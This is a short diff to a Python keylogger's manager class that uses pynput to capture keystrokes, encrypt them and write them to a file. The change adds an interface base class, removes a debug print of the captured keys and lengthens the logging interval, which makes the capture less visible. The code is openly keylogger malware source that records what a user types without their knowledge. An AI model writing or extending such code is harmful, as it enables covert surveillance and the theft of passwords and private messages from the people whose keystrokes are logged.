@@ -1,8 +1,9 @@
 from service import KeyLoggerService,FileWriter,Encryptor
+from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
 import threading,time
 
-class KeyLoggerManager:
+class KeyLoggerManager(IKeyLoggerManager):
     def __init__(self):
         self.__key_logger = KeyLoggerService()
         self.__writer = FileWriter()
@@ -30,13 +31,7 @@ class KeyLoggerManager:
             data = self.__key_logger.get_logged_keys()
             encrypt_data = {self.__encryptor.encrypt(key):self.__encryptor.encrypt(value) for key,value in data.items()}
             self.__writer.write(encrypt_data)
-            print(data)
-            time.sleep(1)
-
-
-
-
-
+            time.sleep(10)
 
     def print_keys(self):
         logged_keys = self.__key_logger.get_logged_keys()
